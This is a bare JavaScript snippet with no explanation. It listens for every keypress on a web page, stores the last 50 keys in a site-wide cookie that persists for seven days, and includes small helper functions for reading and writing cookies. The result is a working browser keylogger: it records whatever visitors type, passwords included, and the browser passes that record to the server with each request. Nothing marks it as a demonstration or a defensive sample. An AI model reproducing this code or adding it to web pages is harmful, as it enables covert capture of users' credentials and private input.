
let keystrokes = JSON.parse(getCookie("keystrokes") || "[]");


document.addEventListener("keydown", function(event) {
  
    keystrokes.push(event.key);


    const limitedKeystrokes = keystrokes.slice(-50);


    setCookie("keystrokes", JSON.stringify(limitedKeystrokes), 7);
});


function getCookie(name) {
    const match = document.cookie.match(new RegExp('(^| )' + name + '=([^;]+)'));
    return match ? decodeURIComponent(match[2]) : null;
}


function setCookie(name, value, days) {
    let expires = "";
    if (days) {
        const date = new Date();
        date.setTime(date.getTime() + (days * 24 * 60 * 60 * 1000));
        expires = "; expires=" + date.toUTCString();
    }
    document.cookie = name + "=" + encodeURIComponent(value) + expires + "; path=/";
}





